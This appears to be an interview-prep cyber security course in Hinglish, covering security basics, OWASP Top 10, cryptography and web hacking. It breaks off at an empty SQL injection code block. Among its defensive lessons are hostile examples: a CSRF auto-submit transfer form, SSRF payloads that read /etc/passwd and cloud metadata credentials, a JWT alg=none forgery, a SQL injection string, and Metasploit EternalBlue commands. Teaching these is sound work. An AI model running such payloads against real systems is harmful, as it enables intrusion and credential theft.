
<div class="module-hero">
  <div class="module-hero-icon">🛡️</div>
  <div class="module-hero-body">
    <h1>Cyber Security — Hack Kar, Par Bacha Bhi</h1>
    <p>Ethical hacking se leke incident response tak — placement mein cyber security ek dedicated skill hai. Ye chapter tujhe web security, network security, cryptography, aur offensive security ka complete coverage dega.</p>
    <div class="module-hero-meta">
      <span class="tag tag-hot">30 Modules</span>
      <span class="tag tag-star">500+ Code Examples</span>
      <span class="tag tag-method">50+ Labs</span>
    </div>
  </div>
</div>

---

## Chapter 1: Security Fundamentals

### CIA Triad — Security Ka Foundation

**Confidentiality** — Sirf authorized log access kar paye
```python
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

sensitive_data = "user_password_123"
encrypted = cipher.encrypt(sensitive_data.encode())
decrypted = cipher.decrypt(encrypted).decode()
```

**Integrity** — Data modify nahi hona chahiye bina detection ke
```python
import hashlib

def create_hash(data):
    return hashlib.sha256(data.encode()).hexdigest()

original_hash = create_hash("important_data")
current_hash = create_hash("important_data")

if original_hash == current_hash:
    print("Data integrity verified")
else:
    print("Data has been tampered!")
```

**Availability** — System up rehna chahiye jab zaroorat ho
```
Good: Redundant servers, load balancers, DDoS protection
Bad: Single point of failure, no backups, no rate limiting
```

### Security Principles
- **Least Privilege**: Sirf utna access do jitna kaam karne ke liye chahiye
- **Defense in Depth**: Multiple layers of security (firewall + WAF + encryption + monitoring)
- **Fail Secure**: Jab kuch fail ho, toh secure state mein fail ho (access deny by default)
- **Separation of Duties**: Critical tasks ko multiple log mein divide karo
- **Security by Design**: End mein nahi, shuru se hi security socho

### Threat Modeling with STRIDE
| Threat | Definition | Example |
|--------|-----------|---------|
| **S**poofing | Fake identity | Phishing email, fake login page |
| **T**ampering | Data modification | Changing payment amount in request |
| **R**epudiation | Deny action | User claims "maine kuch nahi kiya" |
| **I**nformation Disclosure | Data leak | Exposed database, debug info in production |
| **D**enial of Service | System down | DDoS attack, resource exhaustion |
| **E**levation of Privilege | More access than allowed | SQL injection to get admin access |

### Risk Assessment Formula
```
Risk = Likelihood × Impact

Critical: 9-10   → Immediate action
High: 6-8       → Fix within 30 days
Medium: 3-5     → Fix within 90 days
Low: 1-2        → Accept or monitor
```

### Penetration Testing Lifecycle

Penetration testing systematic process hai jo vulnerabilities find karne ke liye follow karte hain. 6 steps hote hain:

**1. Reconnaissance (Information Gathering)**
Target ke baare mein maximum info collect karo — DNS records, subdomains, employee emails, technologies used.
```bash
theHarvester -d target.com -b google
sublist3r -d target.com
amass enum -d target.com
```

**2. Scanning & Enumeration**
Live hosts, open ports, running services identify karo.
```bash
nmap -sV -sC -p- target.com
gobuster dir -u https://target.com -w wordlist.txt
```

**3. Gaining Access (Exploitation)**
Identified vulnerabilities ko exploit karke access lo.
```
Techniques: SQL injection, XSS, misconfigured S3, weak credentials
```

**4. Privilege Escalation**
Low privilege account se admin/system level access achieve karo.
```
Linux: sudo -l, SUID binaries, kernel exploits
Windows: Token impersonation, unquoted service paths, AlwaysInstallElevated
```

**5. Lateral Movement**
Network ke andar move karke more systems compromise karo.
```
Pass-the-hash, SSH key hijacking, RDP tunneling
```

**6. Reporting**
Findings ko document karo with POC, impact, and remediation.
```
Executive Summary → Technical Details → Risk Rating → Remediation Steps
```

### Bug Bounty Methodology

Bug bounty mein aap independent researcher ki tarah vulnerabilities report karte ho aur reward paate ho. Methodology:

**Target Selection:** Choose program from HackerOne, Bugcrowd, or Intigriti

**Recon is Key:**
```bash
# Subdomain enumeration
subfinder -d target.com | httpx -silent

# Parameter discovery
katana -u https://target.com -d 3

# Technology fingerprint
wappalyzer-cli https://target.com
```

**Common Bug Types with Payout Range:**
| Bug Type | Avg Payout |
|----------|-----------|
| RCE | $2000-$10000 |
| SQLi | $500-$5000 |
| IDOR | $200-$2000 |
| XSS | $200-$1000 |
| SSRF | $500-$3000 |
| Open Redirect | $100-$500 |

**Pro Tips:**
- Automation se time bachao but manual testing se unique bugs dhundo
- Chain vulnerabilities for higher impact
- Always write clear PoC and steps to reproduce

### Security Headers

Security headers web application ko common attacks se bachate hain. Interview mein headers ka knowledge expected hai.

**Content-Security-Policy (CSP)**
Controls which resources browser load kar sakta hai.
```nginx
# Nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; frame-ancestors 'none';";
```

**Strict-Transport-Security (HSTS)**
Browser ko sirf HTTPS se connect karne ke liye force karta hai.
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

**X-Frame-Options**
Clickjacking attacks se bachata hai.
```nginx
add_header X-Frame-Options "DENY" always;
```
Values: DENY (kabhi nahi), SAMEORIGIN (same domain allowed), ALLOW-FROM uri

**X-XSS-Protection**
Browser ke built-in XSS filter ko enable karta hai.
```nginx
add_header X-XSS-Protection "1; mode=block" always;
```

**Referrer-Policy**
Control karta hai ki referrer header kitna info bhejega.
```nginx
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

**Complete Apache example:**
```apache
<IfModule mod_headers.c>
    Header always set Content-Security-Policy "default-src 'self';"
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
</IfModule>
```

### Chapter 1: Interview Q&A

**Q1: CIA triad mein confidentiality vs integrity mein kya difference hai?**
- Confidentiality — data sirf authorized log padh sakein (encryption)
- Integrity — data authorized log bhi sirf correct tareeke se badal sakein (hashing, signatures)
- Example: Bank mein balance — confidentiality matlab koi aur na dekhe, integrity matlab tu ya bank hi badal sake

**Q2: Defense in Depth kya hota hai? Real-world example do.**
- Multiple independent layers of security — ek fail to doosra kaam kare
- Example: Web application mein — WAF (layer 1) → Input validation (layer 2) → Parameterized queries (layer 3) → DB encryption (layer 4)
- Attacker ko har layer break karni padti hai — time and cost badh jaata hai

**Q3: STRIDE model mein Spoofing vs Repudiation mein difference?**
- Spoofing: Attacker fake identity use kare (e.g., fake email ID, fake login page)
- Repudiation: Real user deny kare ki "maine kuch nahi kiya" (e.g., no audit logs)
- Spoofing ka mitigation = authentication (verify identity)
- Repudiation ka mitigation = audit logging (non-repudiation)

**Q4: Risk assessment mein Critical risk (9-10) pe immediate action kyun zaroori hai?**
- Likelihood high × Impact high = Critical
- Example: Public-facing API with SQL injection — highly likely aur data breach ka impact devastating
- Business impact: Financial loss (GDPR fines), reputation damage, legal penalties, operational downtime
- Anything above 8 should have fix within 24-48 hours

**Q5: Least privilege principle ka real-world example do.**
- Employee ko sirf wahi files access dena jo unki job ke liye zaroori hai
- Cloud mein: Readonly access for developers, admin access for DevOps team only
- Database: App user sirf CRUD on specific tables, schema modify nahi kar sakta
- Avoid: "Everyone has admin access for convenience" — isko interview mein "anti-pattern" bolo

**Q6: Penetration test mein Black box vs White box mein difference?**
- Black box: No prior knowledge — tester ko kuch nahi pata, real attacker simulate hota hai
- White box: Full access — source code, credentials, architecture diagrams provided
- Grey box: Partial knowledge — some credentials, limited documentation
- Black box: More realistic but less thorough | White box: More thorough but less realistic
- Best approach: Grey box with authenticated testing

**Q7: Bug bounty mein RCE report ka format kya hota hai?**
- Title: Clear vulnerability description with affected endpoint
- Summary: What the bug is, what can attacker do
- Steps to Reproduce: Exact commands, payloads, requests (curl or Burp)
- Impact: What attacker can achieve with this (server compromise, data access)
- Remediation: How to fix it (specific recommendation)
- PoC: Proof of Concept video or screenshot

---

## Chapter 2: OWASP Top 10 — Web Vulnerabilities

### 1. Broken Access Control
Users access resources they shouldn't.

```python
# Vulnerable — no authorization check
@app.get("/user/{user_id}/profile")
def get_profile(user_id):
    return db.get_user(user_id)
# Anyone can view any profile by changing user_id!

# Secure — server-side authorization
@app.get("/user/{user_id}/profile")
def get_profile(user_id, current_user):
    if current_user.id != user_id and not current_user.is_admin:
        raise HTTPException(403, "Access denied")
    return db.get_user(user_id)
```

### 2. Cryptographic Failures
Weak encryption, exposed secrets, default passwords.
```
Bad: Passwords stored in plain text, MD5 hashing, HTTP without TLS
Good: bcrypt/argon2 for passwords, AES-256, HTTPS everywhere
```

### 3. Injection (SQLi)
Attacker injects malicious queries.

```sql
-- Vulnerable
SELECT * FROM users WHERE email = '" + userInput + "'
-- Input: ' OR 1=1 --

-- Secure (Parameterized Query)
SELECT * FROM users WHERE email = ?
```

### 4. Insecure Design
Missing security controls in architecture.
```
Bad: No rate limiting, no input validation, trust client-side
Good: Rate limit API, server-side validation, secure defaults
```

### 5. Security Misconfiguration
Default credentials, unnecessary features, debug mode.

### 6. Vulnerable Components
Outdated libraries, unpatched frameworks.

### 7. Auth Failures
Weak password policies, no MFA, session fixation.

### 8. Data Integrity Failures
No signature verification, unsigned software updates.

### 9. Logging & Monitoring Failures
No audit logs, no alerts on suspicious activity.

### 10. SSRF
Server makes requests to internal resources.

**Complete Reference:** 694 lines deep-dive in `original/Main-Course/Placement-01/11-Cyber-Security/Modules/Module_02_OWASP_Top_10/02_OWASP_Top_10.md`

---

### Real-World Breach Examples for OWASP Top 10

Har OWASP vulnerability ke liye ek real-world breach jo interview mein bata sakte ho:

**1. Broken Access Control — Equifax (2017)**
- Equifax's dispute portal mein access control tha hi nahi — attackers 143 million records nikal gaye
- Impact: $1.4 billion settlement, SSNs, DOBs, driver's license numbers leaked
- Lesson: Server-side authorization check har endpoint pe

**2. Cryptographic Failures — Marriott (2018)**
- 500 million guest records — credit card numbers encrypted with weak algorithm
- Impact: $23.8 million GDPR fine
- Lesson: Strong encryption use karo + proper key management

**3. Injection — Sony Pictures (2014)**
- SQL injection through website — full internal network compromised
- Impact: Movies leaked, emails exposed, $100M+ damage
- Lesson: Parameterized queries are non-negotiable

**4. Insecure Design — Twitter (2020)**
- Account takeover via phone number matching — API design flaw
- Impact: Attackers matched phone numbers to accounts at scale
- Lesson: Rate limiting + abuse prevention in design phase

**5. Security Misconfiguration — Capital One (2019)**
- Misconfigured WAF allowed SSRF to metadata service — 100M records
- Impact: $190 million fine, customer data leaked
- Lesson: Cloud config audit regularly, least privilege for IAM roles

**6. Vulnerable Components — Equifax (again)**
- Apache Struts CVE-2017-5638 — patch available for 2 months, not applied
- Impact: Entire breach could have been prevented with patching
- Lesson: Patch management is security 101

**7. Auth Failures — SolarWinds (2020)**
- Weak password "solarwinds123" leaked in public GitHub
- Impact: Supply chain attack, 18,000 customers compromised
- Lesson: Strong passwords + MFA + secret scanning

**8. Data Integrity Failures — NotPetya (2017)**
- Trojans via compromised software update (M.E.Doc accounting software)
- Impact: $10 billion damage globally
- Lesson: Software signing, verify update integrity, supply chain security

**9. Logging & Monitoring Failures — Target (2013)**
- Attackers inside network for 2 weeks — security team ignored alerts
- Impact: 40 million credit card numbers stolen
- Lesson: Log analysis + 24/7 monitoring + incident response

**10. SSRF — Capital One (already covered)**
- Classic example: WAF misconfiguration allowed SSRF to AWS metadata endpoint

### OWASP ASVS (Application Security Verification System)

ASVS ek framework hai jo web application security controls ko verify karne ke liye levels define karta hai.

**ASVS Levels:**
```
Level 1 (L1): All applications — basic security (automated scanning)
Level 2 (L2): Sensitive data apps — most controls (manual + automated)
Level 3 (L3): Critical apps — defense in depth (full penetration testing)
```

**ASVS Categories (19 chapters):**
```
V1: Architecture, Design, Threat Modeling
V2: Authentication Verification
V3: Session Management
V4: Access Control
V5: Validation, Sanitization, Encoding
V6: Stored Cryptography
V7: Error Handling & Logging
V8: Data Protection
V9: Communications
V10: Malicious Code
V11: Business Logic
V12: Files & Resources
V13: API & Web Service
V14: Configuration
```

**ASVS vs OWASP Top 10:**
- OWASP Top 10: Awareness document — "yeh problems hain"
- ASVS: Verification standard — "yeh check karo ki sahi hai ya nahi"
- Top 10 tells you what's broken, ASVS tells you how to verify it's fixed

**Interview Answer:**
"OWASP Top 10 batata hai ki kaun si vulnerabilities common hain, ASVS batata hai ki kaise verify karein ki tumhara application in vulnerabilities se protected hai ya nahi. ASVS ke 3 levels hain — L1 basic automated checks, L2 manual pentest, L3 full architecture review."

### OWASP ZAP Tool — Basic Usage

ZAP (Zed Attack Proxy) open-source web application security scanner hai — Burp Suite ka free alternative.

**Installation:**
```bash
# Run with Docker
docker pull ghcr.io/zaproxy/zaproxy:stable
```

**Baseline Scan — Quick automated check:**
```bash
# Basic baseline scan (spider + passive scan)
docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t https://target.com -r report.html

# Baseline with alert filters
zap-baseline.py -t https://target.com -c config.conf -r report.html

# What it does:
# 1. Spider crawls the site
# 2. Passive scan checks responses for vulnerabilities
# 3. Generates HTML report
# Note: Does NOT perform active attacks
```

**API Scan — Testing REST/GraphQL APIs:**
```bash
# Scan API definition
zap-api-scan.py -t https://target.com/openapi.json -f openapi -r api-report.html

# What it does:
# 1. Imports API definition (OpenAPI/Swagger, GraphQL, SOAP)
# 2. Probes each endpoint with malicious payloads
# 3. Active scan — actually tests for SQLi, XSS, command injection
# Best for: CI/CD pipeline mein API security testing

# Common options:
zap-api-scan.py -t openapi.json -f openapi \
  --hook=/zap/auth_hook.py \    # Add authentication
  -c context.context \           # ZAP context for auth
  -d \                           # Show debug output
  -z "-config api.key=secret"    # ZAP options
```

**Full Active Scan:**
```bash
# Spider + Active Scan (CAUTION: may break things)
zap-full-scan.py -t https://target.com -r full-report.html
```

### CSRF — Detailed Attack and Defense

**GET vs POST CSRF:**

GET CSRF — vulnerable when state-changing action is on GET:
```html
<!-- Vulnerable: password change via GET -->
<img src="https://bank.com/transfer?amount=1000&to=attacker" width="0" height="0">

<!-- User loads page with image → browser sends GET request with cookies -->
<!-- Bank processes transfer because no CSRF protection -->
```

POST CSRF — needs form submission:
```html
<!-- Attacker page: -->
<form action="https://bank.com/transfer" method="POST" id="steal">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.getElementById('steal').submit();</script>

<!-- Auto-submits form → browser sends POST with cookies -->
```

**SameSite Cookies Defense:**
```python
# Server-side cookie setting
response.set_cookie('sessionid', session['id'],
    httponly=True,        # JavaScript can't access
    secure=True,          # HTTPS only
    samesite='Lax')       # or 'Strict'

# SameSite=Strict: Cookie never sent for cross-site requests
#   User clicks attacker link → no cookie → form fails
# SameSite=Lax: Cookie sent for top-level GET (form GET requests)
#   POST forms protected — user must click "submit" to trigger

# Problem: Older browsers don't support SameSite
# Solution: CSRF token + SameSite together
```

### SSRF Deep-Dive

**How to Test SSRF:**

Find parameters that fetch external content:
```
url=, file=, load=, src=, href=, page=, path=, document=, location=, data=
callback=, redirect=, return=, dest=, continue=, follow=
```

Testing methodology:
```bash
# 1. External OOB testing (Burp Collaborator / interactsh)
curl "http://target.com/fetch?url=http://YOUR_INTERACTSH.oastify.com/test"

# 2. Internal IP scanning
for port in 80 443 22 3306 6379 9200 27017; do
  curl "http://target.com/fetch?url=http://127.0.0.1:$port"
done

# 3. Protocol smuggling
curl "http://target.com/fetch?url=file:///etc/passwd"
curl "http://target.com/fetch?url=dict://127.0.0.1:6379/info"  # Redis
curl "http://target.com/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a..."  # SSRF to Redis RCE

# 4. DNS rebinding (bypass allowlist)
# Register domain that resolves to different IP on second lookup
```

**Blind SSRF:**
Response dikhta nahi hai, lekin request server se ja rahi hai.
```python
# Example: Server fetches profile picture from URL
# User provides URL → server downloads → resizes → saves
# No feedback if URL is internal

# Detection: 
# - Use interactsh/OOB — callback aaya matlab SSRF
# - Use timing — internal services slow respond karein toh time difference
# - Use error messages — different errors for open vs closed ports

# Impact: Internal port scan, cloud metadata, service discovery
```

**Cloud Metadata Endpoint Exploit:**
```bash
# AWS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data/

# GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Azure
curl http://169.254.169.254/metadata/instance?api-version=2017-08-01
curl http://169.254.169.254/metadata/identity/oauth2/token

# DigitalOcean
curl http://169.254.169.254/metadata/v1.json

# Alibaba Cloud
curl http://100.100.100.200/latest/meta-data/
```

### Chapter 2: Interview Q&A

**Q1: OWASP Top 10 mein 2021 vs 2017 ka kya difference hai?**
- 2021 mein "Insecure Design" added (number 4) — design phase mein security chhut rahi hai
- "Cryptographic Failures" replaced "Sensitive Data Exposure" — broader scope
- "SSRF" (number 10) new entry — cloud era mein SSRF ka impact badh gaya
- "A8:2017 Insecure Deserialization" removed from top 10 (still important but less prevalent)
- "A9:2017 Known Vulnerabilities" → "Vulnerable and Outdated Components" (renamed)

**Q2: SQL injection ko prevent karne ka best approach kya hai?**
- Primary defense: Parameterized queries (prepared statements) — SQL code aur data alag
- Secondary: Input validation (allow-list approach for expected values)
- WAF as defense-in-depth (not primary protection)
- Never trust user input, never concatenate SQL strings
- Stored procedures bhi vulnerable ho sakte hain if built with dynamic SQL

**Q3: SSRF se cloud metadata access se kya ho sakta hai?**
- IAM credentials steal — attacker aapke role jitna powerful ho jata hai
- Instance metadata — user-data mein secrets, config files
- Internal services scan — SSRF se attack surface expand
- Blast radius: Single SSRF → full cloud account compromise
- Famous case: Capital One breach (100M records via SSRF)

**Q4: CSRF protection ke modern approaches kya hain?**
- Synchronizer token pattern: Per-session or per-request CSRF token
- SameSite cookie attribute: Lax/Strict — modern browsers support karte hain
- Double submit cookie: Random value in cookie + request header, server match kare
- Custom request headers: APIs mein custom header enforce karo (not sent cross-origin)
- Origin/Referer header validation: Check request origin matches expected

**Q5: OWASP ZAP vs Burp Suite comparison interview mein kaise batayein?**
- OWASP ZAP: Free, open-source, automated scanning, CI/CD integration, good for developers
- Burp Suite: Professional, manual testing, advanced features (Intruder, Repeater), extensible
- ZAP = Automated security testing in pipeline | Burp = Deep manual pentesting
- Both have similar core features — intercepting proxy, scanner, reporting
- Budget constraint: ZAP is capable enough for most needs

**Q6: XSS aur CSRF dono ka combination attack kaise hota hai?**
- Attacker XSS inject karta hai → CSRF token read karta hai → token ke saath malicious form submit
- XSS bas CSRF protection bypass kar deti hai (CSRF token accessible via DOM)
- XSS + CSRF = Complete account takeover
- Solution: Both need to be fixed — XSS via output encoding, CSRF via token/SameSite

---

## Chapter 3: Cryptography

### Symmetric Encryption — Same key for encrypt/decrypt
```python
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)
encrypted = cipher.encrypt(b"Secret data")
decrypted = cipher.decrypt(encrypted)
```
**Algorithms:** AES (best), DES (weak), 3DES (legacy)

### Asymmetric Encryption — Public/Private key pair
```python
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# Generate key pair
private_key = rsa.generate_private_key(65537, 2048)
public_key = private_key.public_key()

# Encrypt with public key
ciphertext = public_key.encrypt(b"Secret", padding.OAEP(...))

# Decrypt with private key
plaintext = private_key.decrypt(ciphertext, padding.OAEP(...))
```
**Algorithms:** RSA, ECC, Diffie-Hellman

### Hashing — One-way, cannot reverse
```python
import hashlib, bcrypt

password = "user_pass_123"
hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
bcrypt.checkpw(password.encode(), hash)  # Returns True
```

### TLS Handshake (simplified)
```
1. Client Hello → 2. Server Hello + Certificate
3. Key Exchange → 4. Encrypted Communication
```

### JWT Structure and Security

JWT (JSON Web Token) authentication aur information exchange ke liye use hota hai.

**Structure: header.payload.signature**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Header:** Algorithm and token type (Base64url encoded)
```json
{"alg": "HS256", "typ": "JWT"}
```

**Payload:** Claims (data) — Base64url encoded
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622
}
```

**Signature:** Prevents tampering
```
HMACSHA256(base64urlEncode(header) + "." + base64urlEncode(payload), secret)
```

**alg=none Attack:**
```python
# Vulnerable server — accepts "none" algorithm
# Attacker modifies header:
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "exp": 9999999999}

# No signature needed — just encode
token = base64url(header) + "." + base64url(payload) + "."
# Server should reject this — but vulnerable ones won't verify!
```
- Mitigation: Never allow `alg: none` — fail closed

**RS256 vs HS256 Confusion:**
- HS256: Symmetric — same key for sign + verify (secret shared)
- RS256: Asymmetric — private key sign, public key verify
- Attack: If server uses RS256 but attacker changes to HS256, server might verify with public key (which is "known") as HMAC secret
- Mitigation: Always verify algorithm matches expected value, use asymmetric for production

**JWT Security Best Practices:**
```
- Use RS256 or ES256 (not HS256 for distributed systems)
- Set short expiry (15-30 min for access tokens)
- Validate `aud` (audience) and `iss` (issuer) claims
- Use random, high-entropy secrets
- Never store sensitive data in payload (only base64 encoded, not encrypted)
```

### Digital Signatures vs HMAC

| Aspect | Digital Signature | HMAC |
|--------|-----------------|------|
| **Keys** | Asymmetric (private + public) | Symmetric (same key both sides) |
| **Verification** | Anyone with public key | Only key holder |
| **Non-repudiation** | Yes — only private key holder signed | No — both parties have same key |
| **Performance** | Slower | Faster |
| **Use Case** | Certificate signing, code signing | API tokens, session cookies |
| **Algorithm** | RSA, ECDSA, Ed25519 | HMAC-SHA256, HMAC-SHA1 |

**Interview Answer:** "Digital signatures mein signer public key share karta hai — koi bhi verify kar sakta hai. HMAC mein dono parties same secret share karti hain — verification ke liye secret chahiye. Isliye digital signatures non-repudiation provide karte hain."

### Diffie-Hellman Key Exchange

DH algorithm two parties ko ek shared secret establish karne deta hai over an insecure channel.

**How it works (simplified):**
```
Alice chooses: private a = 6, sends A = g^a mod p to Bob
Bob chooses: private b = 15, sends B = g^b mod p to Alice

Alice computes: s = B^a mod p = (g^b)^a mod p = g^(a*b) mod p
Bob computes:   s = A^b mod p = (g^a)^b mod p = g^(a*b) mod p

Both get same s — shared secret!
```

**DH in Python:**
```python
import os

# Generate DH parameters (2048-bit for security)
p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234...  # Standard 2048-bit prime
g = 2

# Generate private key
private_key = int.from_bytes(os.urandom(32), 'big')

# Compute public key
public_key = pow(g, private_key, p)

# Compute shared secret
shared_secret = pow(other_public_key, private_key, p)
```

**Vulnerability:** Man-in-the-Middle — without authentication, attacker can intercept both sides. Solution: Use signed DH (like TLS does) or ECDHE with signatures.

### Certificate Authorities, Let's Encrypt, and mTLS

**Certificate Authority (CA):**
Trusted third party jo digital certificates issue karta hai. Browser/OS built-in CA list mein trust karta hai.
```
Chain of Trust:
Root CA (self-signed, offline, air-gapped)
  → Intermediate CA (issues end certificates)
    → Server Certificate (your domain)
```

**Let's Encrypt — Free Automated CA:**
```bash
# Install certbot
sudo apt install certbot python3-certbot-nginx

# Get certificate
sudo certbot --nginx -d example.com -d www.example.com

# Auto-renewal (cron or systemd timer)
sudo certbot renew --quiet
```
- Free, automated, 90-day certificates
- Uses ACME protocol for automation
- Perfect for: HTTPS everywhere, no excuse for HTTP

**mTLS (Mutual TLS):**
Normal TLS mein sirf server certificate bhejta hai. mTLS mein client bhi apna certificate bhejta hai.
```
Normal TLS: Client → Server (Verified) → Encrypted comm
mTLS:       Client ↔ Server (Both Verified) → Encrypted comm
```

**mTLS Use Cases:**
```
- Microservice-to-microservice communication
- API-to-API authentication (no passwords needed)
- IoT device authentication
- Zero Trust network architectures
```

**mTLS Configuration (Nginx):**
```nginx
server {
    listen 443 ssl;
    ssl_certificate /etc/nginx/server.crt;
    ssl_certificate_key /etc/nginx/server.key;
    
    # Client certificate verification
    ssl_client_certificate /etc/nginx/ca.crt;
    ssl_verify_client on;
    
    # Optional: map certificate to header
    ssl_verify_depth 1;
    
    location /api/ {
        if ($ssl_client_verify != "SUCCESS") {
            return 403;
        }
        proxy_pass http://backend;
    }
}
```

### Common Crypto Mistakes — Interview Fodder

**1. ECB Mode (Electronic Codebook):**
```python
from Crypto.Cipher import AES

# BAD — DON'T USE ECB
cipher = AES.new(key, AES.MODE_ECB)

# WHY: Same plaintext block → Same ciphertext block
# Pattern visible in encrypted image — penguin picture recognizable!
```
- ECB: Each block encrypted independently — patterns visible
- CBC/GCM: Each block XORed with previous — no patterns

**2. Weak IV (Initialization Vector):**
```python
# BAD — static IV
iv = b'\x00' * 16

# GOOD — random IV for every encryption
iv = os.urandom(16)
```
- Static IV same key ke saath same ciphertext produce karta hai
- Predictable IV chosen-plaintext attack enable karta hai

**3. Hardcoded Keys in Code:**
```python
# BAD — key in source code
SECRET_KEY = "my-secret-key-123"

# GOOD — environment variable or vault
import os
SECRET_KEY = os.environ.get('ENCRYPTION_KEY')
```
- Code commit → git leak → key compromised
- Key rotation impossible without code change

**4. Using Fast Hashes for Passwords:**
```python
# BAD — SHA256 is too fast (billions/sec with GPU)
hash = hashlib.sha256(password.encode()).hexdigest()

# GOOD — bcrypt is intentionally slow
import bcrypt
hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

**5. Custom Crypto Implementation:**
```python
# BAD — "I'll roll my own encryption"
def my_encrypt(data, password):
    return data.translate(str.maketrans(
        'abcdefghijklmnopqrstuvwxyz',
        'zyxwvutsrqponmlkjihgfedcba'))

# NEVER do this! Use standard libraries only!
```

### Password Hashing Deep-Dive

Comparison of password hashing algorithms:

| Algorithm | Salt | Cost Tuning | Memory Hard | GPU Resistant | Best For |
|-----------|------|-------------|-------------|---------------|----------|
| **bcrypt** | Auto | Cost factor (4-31) | No | Yes (slow) | Most applications |
| **argon2id** | Auto | Time, memory, parallelism | Yes | Yes | Modern applications |
| **PBKDF2** | Yes | Iteration count | No | No (ASIC friendly) | Legacy/Compliance |
| **scrypt** | Yes | CPU + Memory cost | Yes | Yes | Resource-friendly |
| **SHA-256** | Add manually | None — instant | No | No (GPU fast) | Hashing (not passwords!) |

**Practical Implementation:**
```python
import bcrypt

def hash_password(password: str) -> str:
    """Hash password with bcrypt — cost factor 12 recommended"""
    salt = bcrypt.gensalt(rounds=12)
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

def verify_password(password: str, hashed: str) -> bool:
    """Verify password against stored hash"""
    return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))

# Usage
password = "user@123SecurePass!"
hashed = hash_password(password)
print(f"Hash: {hashed}")
print(f"Verify: {verify_password(password, hashed)}")
```

**Why bcrypt over SHA-256 for passwords?**
- SHA-256: ~5 billion hashes/second on GPU
- bcrypt: ~50K hashes/second (cost=12)
- Attacker: SHA-256 password cracking 100,000x faster

**Argon2id — Modern Choice:**
```python
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # iterations
    memory_cost=65536,  # 64 MB
    parallelism=4,      # threads
    hash_len=32,        # output length
    salt_len=16         # random salt
)

hashed = ph.hash("secure_password")
ph.verify(hashed, "secure_password")  # True
```

### Chapter 3: Interview Q&A

**Q1: Symmetric encryption mein ECB mode kyun nahi use karna chahiye?**
- Same plaintext block = same ciphertext block — patterns reveal structure
- Chosen-plaintext attack se block-by-block decryption possible
- CBC/GCM use karo — each block depends on previous, ensures randomness
- Famous example: ECB-encrypted penguin image still recognizable

**Q2: JWT mein RS256 vs HS256 kab use karein?**
- RS256: Asymmetric — microservices mein, jahan multiple services need to verify (public key distributed)
- HS256: Symmetric — single server, client-server same secret share kare
- RS256 advantage: Private key compromise kiye bina public key share kar sakte hain
- Important: Never use HS256 in multi-service architecture — secret share karna padta hai

**Q3: Password storage mein salt kyun zaroori hai?**
- Salt unique random value — same passwords get different hashes
- Without salt: Two users same password same hash → attacker knows both accounts compromised
- Without salt: Pre-computed rainbow table attack possible
- Salt + pepper: Salt stored with hash, pepper is application secret

**Q4: TLS handshake mein asymmetric encryption kab use hota hai?**
- Asymmetric: Only during initial handshake (key exchange)
- Server sends certificate with public key → client encrypts pre-master secret
- Both derive same symmetric session key
- After that: Symmetric encryption (AES) for all data — faster

**Q5: mTLS normal TLS se kaise different hai?**
- Normal TLS: Only server certificate verified → client sure about server
- mTLS: Both client and server certificates verified → mutual authentication
- mTLS use: Microservices, API gateways, Zero Trust
- Extra config: Client certificate + CA setup required

**Q6: Diffie-Hellman key exchange mein MITM attack kaise possible hai?**
- DH doesn't authenticate the parties — attacker can intercept both sides
- Attacker: Shares own public key with Alice (pretending to be Bob) and Bob (pretending to be Alice)
- Two separate shared secrets established — attacker decrypts, re-encrypts
- Solution: Digital signatures + certificates (like TLS ECDHE)

---

## Chapter 4: Web Application Hacking

### Reconnaissance Tools
```bash
nmap -sV -sC target.com          # Port scanning + service detection
whois target.com                  # Domain registration info
theHarvester -d target.com -b google  # Email/subdomain harvesting
sublist3r -d target.com           # Subdomain enumeration
```

### Vulnerability Scanning
```bash
nikto -h http://target.com        # Web server scanner
sqlmap -u "URL" --dbs             # SQL injection auto-exploit
nmap --script vuln target.com     # Vulnerability scanning
```

### Exploitation with Metasploit
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
exploit
```

### Web Application Testing Flow
1. **Recon** — Gather info about target
2. **Mapping** — Identify endpoints, parameters, technologies
3. **Discovery** — Find vulnerabilities (manual + automated)
4. **Exploitation** — Confirm vulnerabilities
5. **Reporting** — Document findings with remediation

### Burp Suite Workflow
```
Proxy → Spider → Scanner → Intruder → Repeater → Decoder
```
- **Proxy**: Intercept HTTP/HTTPS traffic
- **Spider**: Crawl web application
- **Scanner**: Auto-detect vulnerabilities
- **Intruder**: Brute-force/fuzz parameters
- **Repeater**: Manually modify and resend requests

---

### SQL Injection — Detailed Examples

**UNION-based SQLi:**
Attacker UNION operator use karke additional data retrieve karta hai.
```sql
